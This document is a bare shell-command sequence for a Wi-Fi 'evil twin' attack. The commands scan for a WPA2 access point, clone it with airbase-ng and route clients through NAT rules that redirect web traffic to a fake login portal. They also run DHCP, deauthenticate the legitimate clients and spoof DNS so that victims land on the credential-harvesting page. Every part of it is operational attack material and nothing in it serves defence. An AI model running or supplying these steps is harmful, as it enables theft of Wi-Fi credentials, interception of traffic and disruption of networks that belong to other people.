# Setup monitor mode
airmon-ng check kill
/etc/init.d/avahi-daemon stop
airmon-ng start wlan0

# Find an access point to attack
airodump-ng -a wlan0mon
# BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
# 5E:4A:D0:5A:91:7B  -34        3        0    0   6  130  WPA2 CCMP   PSK  Rollie                                                                                                                             

# Spoof the chosen AP
airbase-ng -a $BSSID -c $CHANNEL -e $ESSID wlan0mon

# Boost our signal strength (may not work)
iwconfig wlan0mon txpower 27

# Allocate subnet mask
ifconfig at0 10.0.0.1 up

# Enable NAT
iptables --flush
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface at0 -j ACCEPT
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80
iptables -t nat -A POSTROUTING -j MASQUERADE

# Enable IP Forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Setup DHCP
dnsmasq -C dnsmasq.conf -d

# Start a webserver to host the fake auth page
# where portal/index.html is the fake login page
cd portal
python3 ../webserver.py
cd ..

# Deauth all clients
aireplay-ng --deauth 1 -a $BSSID wlan0mon

# Redirect client to fake auth page
dnsspoof -i at0
